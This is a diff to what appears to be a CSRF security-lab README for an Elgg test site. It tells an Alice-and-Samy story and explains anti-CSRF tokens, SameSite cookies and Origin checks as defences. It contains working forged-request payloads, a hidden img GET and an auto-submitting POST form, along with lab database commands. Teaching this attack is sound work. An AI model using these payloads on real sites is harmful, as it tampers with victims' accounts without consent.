@@ -14,57 +14,112 @@ For authorized educational use only.
 
 ---
 
-## Security Concept
+---
 
-### The Security Hole
-The target web application relies on session cookies for authentication and does **not** verify the origin of state‑changing requests. Browsers automatically include stored cookies on any request to the target domain, even when the request originates from a different site.
+## 📖 The CSRF Story: Alice & Samy
 
-### How it Causes a Problem
-An attacker can host a malicious page on a separate domain (e.g., `www.attacker32.com`). When a victim who is logged into the target site (`www.seed-server.com`) visits the malicious page, the attacker’s page can silently issue forged HTTP requests (GET or POST) to the target site. Because the browser attaches the victim’s authentication cookie, the target server processes the request as if it originated from the victim, allowing actions such as adding friends, changing settings, or performing transactions without the victim’s consent.
+### Act 1 — The Legitimate Session (Alice's Trust)
+* **Alice** (`guid: 56`) visits the trusted social network **`http://www.seed-server.com`** and logs in (`alice` / `seedalice`).
+* Upon successful authentication, the server sets a session cookie (`elggperm` / session ID) in Alice's browser.
+* The browser automatically stores this cookie and will attach it to **every future HTTP request** sent to `www.seed-server.com`.
 
-```
-Alice logs into www.seed-server.com → Browser stores session cookie.
-Alice visits www.attacker32.com → Malicious page includes:
-  <img src="http://www.seed-server.com?action=addfriend&friend=59">
-Browser automatically sends the stored cookie with the request → www.seed-server.com adds Samy as Alice’s friend.
-```
+### Act 2 — The Malicious Bait (Samy's Trap)
+* **Samy** (`guid: 59`, the attacker) builds a deceptive website hosted on a completely separate domain: **`http://www.attacker32.com:81`**.
+* The page lures victims with a "Free Gift Card / Prize" theme.
+* Hidden inside this malicious page are forged requests targeting Alice's account on `www.seed-server.com`.
+
+### Act 3 — The Silent Exploitation
+While Alice is still logged in to Elgg, she opens a new tab and visits Samy's malicious page:
+
+1. **The GET Attack (Add Friend):**
+   * The attacker page includes an invisible 1×1 tracker image:
+     ```html
+     <img src="http://www.seed-server.com/action/friends/add?friend=59" style="display:none;" />
+     ```
+   * The browser parses the `<img>` tag and fires a `GET` request to `www.seed-server.com`.
+   * **The Vulnerability:** Because the destination is `www.seed-server.com`, the browser automatically includes Alice's ambient session cookies. The server cannot tell the difference between Alice clicking "Add Friend" and this silent background request.
+   * **Result:** Samy is instantly added to Alice's friends list.
+
+2. **The POST Attack (Profile Tampering):**
+   * The attacker page contains a hidden HTML form that auto-submits via JavaScript:
+     ```html
+     <form id="csrf-form" action="http://www.seed-server.com/action/profile/edit" method="POST">
+         <input type="hidden" name="name" value="Alice" />
+         <input type="hidden" name="description" value="Hacked by CSRF from attacker32.com!" />
+         <input type="hidden" name="guid" value="56" />
+     </form>
+     <script>document.getElementById('csrf-form').submit();</script>
+     ```
+   * **Result:** Alice's bio is overwritten without her permission.
 
 ```mermaid
 sequenceDiagram
-    actor Alice as Alice (Victim)
-    participant Target as Elgg Target Site\n(www.seed-server.com:10082)
-    participant Attacker as Attacker Site\n(www.attacker32.com:10083)
-    participant DB as MySQL (mysql-10.9.0.6-csrf)
+    autonumber
+    actor Alice as 👩 Alice (Victim)
+    participant Target as 🎯 www.seed-server.com (Elgg)
+    participant Attacker as 💀 www.attacker32.com:81 (Attacker)
+    participant DB as 🗄️ MySQL (elgg_seed)
 
-    Alice->>Target: POST /action/login  (alice / seedalice)
-    Target-->>Alice: Set-Cookie: Elgg=sessiontoken123  (stored by browser)
-
-    Note over Alice,Attacker: Alice visits the attacker site (same browser)
-    Alice->>Attacker: GET / (page loads)
-    Attacker-->>Alice: HTML with hidden <img> and auto-submit <form>
-
-    Note over Alice,Target: Browser auto-fires forged GET request
-    Alice->>Target: GET /index.php?action=addfriend&friend=59\nCookie: Elgg=sessiontoken123  (sent automatically!)
-    Target->>DB: INSERT friend relationship (alice, samy)
-    DB-->>Target: OK
-    Target-->>Alice: 200 OK (Samy added as friend — Alice never clicked anything)
-
-    Note over Alice,Target: Browser auto-submits hidden POST form
-    Alice->>Target: POST /index.php  action=update_profile&bio=Hacked!\nCookie: Elgg=sessiontoken123  (sent automatically!)
-    Target->>DB: UPDATE profile SET bio='Hacked!' WHERE user=alice
-    DB-->>Target: OK
-    Target-->>Alice: 200 OK (profile changed — Alice had no idea)
+    Alice->>Target: 1. Login (alice / seedalice)
+    Target-->>Alice: Set-Cookie: session_id=abc123
+    Note over Alice,Attacker: Alice keeps tab open & visits attacker site
+    Alice->>Attacker: 2. Visit http://www.attacker32.com:81
+    Attacker-->>Alice: 3. Return HTML with hidden forged GET/POST payloads
+    Note over Alice,Target: Browser auto-attaches Alice's cookie to cross-site requests!
+    Alice->>Target: 4. GET /action/friends/add?friend=59 (Cookie: abc123)
+    Target->>DB: INSERT INTO elgg_entity_relationships (56, 'friend', 59)
+    Alice->>Target: 5. POST /action/profile/edit (bio='Hacked!', Cookie: abc123)
+    Target->>DB: UPDATE elgg_metadata SET value='Hacked!' WHERE entity_guid=56
+    Target-->>Alice: 200 OK (Changes saved)
+    Note over Alice,Target: Alice returns to Elgg -> Profile modified!
 ```
 
-### How it is Fixed
-Defense mechanisms include:
-- **Anti‑CSRF Tokens**: Embed a secret, per‑session token in each HTML form or AJAX request and validate it server‑side. The token is not sent automatically by the browser, so forged requests lack it.
-- **SameSite Cookie Attribute**: Set cookies with `SameSite=Strict` or `SameSite=Lax` to prevent them from being sent on cross‑site requests.
-- **Referer/Origin Header Checks**: Verify that state‑changing requests originate from the same origin as the application.
+---
 
-By implementing any of these mitigations, the server can distinguish legitimate user‑initiated actions from forged cross‑origin requests.
+## 🗄️ Database Forensic Evidence: Before & After
 
-This lab requires two containers — one for the target site and one for the attacker site — to correctly simulate the cross-origin attack scenario.
+Inspect the live MySQL container to observe the state change during the attack:
+
+### 1. Baseline Check (Before Attack):
+```powershell
+# Check Alice's friends (should return 0 rows)
+docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT guid_one, relationship, guid_two FROM elgg_entity_relationships WHERE guid_one = 56;"
+
+# Check Alice's profile bio
+docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT entity_guid, name, value FROM elgg_metadata WHERE entity_guid = 56 AND name = 'description';"
+```
+
+### 2. Post-Attack Check (After Visiting Attacker Site):
+```powershell
+# Friend relationship table now contains Samy (59)
+docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT guid_one, relationship, guid_two FROM elgg_entity_relationships WHERE guid_one = 56;"
+
+# Profile metadata bio now contains attacker's string
+docker exec mysql-10.9.0.6-csrf mysql -u seed -pdees elgg_seed -e "SELECT entity_guid, name, value FROM elgg_metadata WHERE entity_guid = 56 AND name = 'description';"
+```
+
+---
+
+## 🛡️ The Resolution: How it is Fixed Step by Step
+
+### Defense 1: Anti-CSRF Synchronizer Tokens (`__elgg_token` & `__elgg_ts`)
+* **Mechanism:** When rendering a legitimate page, the server generates a cryptographically random, unguessable token tied to the user's session:
+  ```html
+  <input type="hidden" name="__elgg_token" value="WBFnQFiJ0Jb6VyZ84vWMnA" />
+  <input type="hidden" name="__elgg_ts" value="1788794932" />
+  ```
+* **Why the Attack Fails:** Due to the **Same-Origin Policy (SOP)**, scripts running on `www.attacker32.com` cannot read the DOM of `www.seed-server.com`. The attacker cannot steal the token, so the forged request arrives without a valid `__elgg_token` and is rejected by the server (`403 Forbidden`).
+
+### Defense 2: `SameSite` Cookie Attribute
+* **Mechanism:** The server flags its authentication cookie with `SameSite=Strict` or `SameSite=Lax`:
+  ```text
+  Set-Cookie: elggperm=xyz789; SameSite=Strict; Path=/; HttpOnly
+  ```
+* **Why the Attack Fails:** The browser strictly blocks cookies flagged with `SameSite=Strict` from being sent on third-party cross-site requests originating from `www.attacker32.com`. The forged request arrives at `www.seed-server.com` as an unauthenticated request and fails.
+
+### Defense 3: Origin / Referer Header Verification
+* **Mechanism:** The server inspects the `Origin` or `Referer` HTTP request header on state-changing requests (`POST`/`PUT`/`DELETE`).
+* **Why the Attack Fails:** When the request is sent from `www.attacker32.com`, the browser sets `Origin: http://www.attacker32.com`. If the server verifies that `Origin !== http://www.seed-server.com`, it immediately drops the request.
 
 ---
 
